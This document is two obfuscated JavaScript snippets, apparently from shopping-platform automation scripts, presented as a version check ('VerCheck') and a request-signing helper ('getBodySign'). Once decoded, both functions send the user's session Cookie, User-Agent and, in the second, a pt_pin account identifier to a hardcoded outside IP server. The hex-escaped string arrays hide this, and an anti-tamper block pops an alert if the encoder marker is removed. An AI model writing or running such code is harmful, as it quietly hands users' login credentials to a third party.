var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdcb86=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x56\x65\x72\x43\x68\x65\x63\x6B\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x76\x65\x72\x3D","","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x64\x61\x74\x61","\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\u7248\u672C\u4FE1\u606F\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A","\x6C\x6F\x67","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u5F53\u524D\u7248\u672C\x3A","\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A","\x20\x20\x20\x20\x20\u5F53\u524D\u7248\u672C\x3A","\x20\x20\u6700\u65B0\u7248\u672C\x3A","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u5EFA\u8BAE\u62C9\u53D6\u811A\u672C\u83B7\u53D6\u65B0\u7248\u672C","\x20\x20\u6700\u65B0\u7248\u672C\x3A\u83B7\u53D6\u5931\u8D25\x21","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function VerCheck(_0x89aax2,_0x89aax3){return  new Promise((_0x89aax4)=>{$[__Oxdcb86[0x10]]({url:`${__Oxdcb86[0x0]}${_0x89aax2}${__Oxdcb86[0x1]}${_0x89aax3}${__Oxdcb86[0x2]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x89aax5,_0x89aax6,_0x89aax7)=>{try{_0x89aax7= JSON[__Oxdcb86[0x3]](_0x89aax7);if(_0x89aax7[__Oxdcb86[0x4]]=== 100){if(_0x89aax3=== _0x89aax7[__Oxdcb86[0x5]]){console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0x8]+ Ver);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}else {console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0xa]+ Ver+ __Oxdcb86[0xb]+ _0x89aax7[__Oxdcb86[0x5]]);console[__Oxdcb86[0x7]](__Oxdcb86[0xc]);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}}else {console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0xa]+ Ver+ __Oxdcb86[0xd]);console[__Oxdcb86[0x7]](__Oxdcb86[0xc]);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}}catch(e){$[__Oxdcb86[0xf]](__Oxdcb86[0xe],e)}finally{_0x89aax4(_0x89aax7)}})})}(function(_0x89aax8,_0x89aax9,_0x89aaxa,_0x89aaxb,_0x89aaxc,_0x89aaxd){_0x89aaxd= __Oxdcb86[0x11];_0x89aaxb= function(_0x89aaxe){if( typeof alert!== _0x89aaxd){alert(_0x89aaxe)};if( typeof console!== _0x89aaxd){console[__Oxdcb86[0x7]](_0x89aaxe)}};_0x89aaxa= function(_0x89aaxf,_0x89aax8){return _0x89aaxf+ _0x89aax8};_0x89aaxc= _0x89aaxa(__Oxdcb86[0x12],_0x89aaxa(_0x89aaxa(__Oxdcb86[0x13],__Oxdcb86[0x14]),__Oxdcb86[0x15]));try{_0x89aax8= __encode;if(!( typeof _0x89aax8!== _0x89aaxd&& _0x89aax8=== _0x89aaxa(__Oxdcb86[0x16],__Oxdcb86[0x17]))){_0x89aaxb(_0x89aaxc)}}catch(e){_0x89aaxb(_0x89aaxc)}})({})


var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdcb84=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x6C\x79\x68\x62\x5F\x68\x65\x6C\x70\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x72\x65\x64\x50\x61\x63\x6B\x65\x74\x49\x64\x3D","\x26\x69\x3D","","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x64\x61\x74\x61","\x64\x61\x74\x61\x31","\x64\x61\x74\x61\x32","\x64\x61\x74\x61\x33","\x64\x61\x74\x61\x34","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function getBodySign(_0xab5fx2,_0xab5fx3,_0xab5fx4,_0xab5fx5){return  new Promise((_0xab5fx6)=>{$[__Oxdcb84[0xd]]({url:`${__Oxdcb84[0x0]}${_0xab5fx2}${__Oxdcb84[0x1]}${_0xab5fx3}${__Oxdcb84[0x2]}${_0xab5fx4}${__Oxdcb84[0x3]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x70\x74\x5F\x70\x69\x6E":_0xab5fx5,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0xab5fx7,_0xab5fx8,_0xab5fx9)=>{try{_0xab5fx9= JSON[__Oxdcb84[0x4]](_0xab5fx9);data1= _0xab5fx9[__Oxdcb84[0x5]];helpno= _0xab5fx9[__Oxdcb84[0x6]]+ _0xab5fx9[__Oxdcb84[0x7]]+ _0xab5fx9[__Oxdcb84[0x8]]+ _0xab5fx9[__Oxdcb84[0x9]]+ _0xab5fx9[__Oxdcb84[0xa]]}catch(e){$[__Oxdcb84[0xc]](__Oxdcb84[0xb],e)}finally{_0xab5fx6(data1)}})})}(function(_0xab5fxa,_0xab5fxb,_0xab5fxc,_0xab5fxd,_0xab5fxe,_0xab5fxf){_0xab5fxf= __Oxdcb84[0xe];_0xab5fxd= function(_0xab5fx10){if( typeof alert!== _0xab5fxf){alert(_0xab5fx10)};if( typeof console!== _0xab5fxf){console[__Oxdcb84[0xf]](_0xab5fx10)}};_0xab5fxc= function(_0xab5fx11,_0xab5fxa){return _0xab5fx11+ _0xab5fxa};_0xab5fxe= _0xab5fxc(__Oxdcb84[0x10],_0xab5fxc(_0xab5fxc(__Oxdcb84[0x11],__Oxdcb84[0x12]),__Oxdcb84[0x13]));try{_0xab5fxa= __encode;if(!( typeof _0xab5fxa!== _0xab5fxf&& _0xab5fxa=== _0xab5fxc(__Oxdcb84[0x14],__Oxdcb84[0x15]))){_0xab5fxd(_0xab5fxe)}}catch(e){_0xab5fxd(_0xab5fxe)}})({})







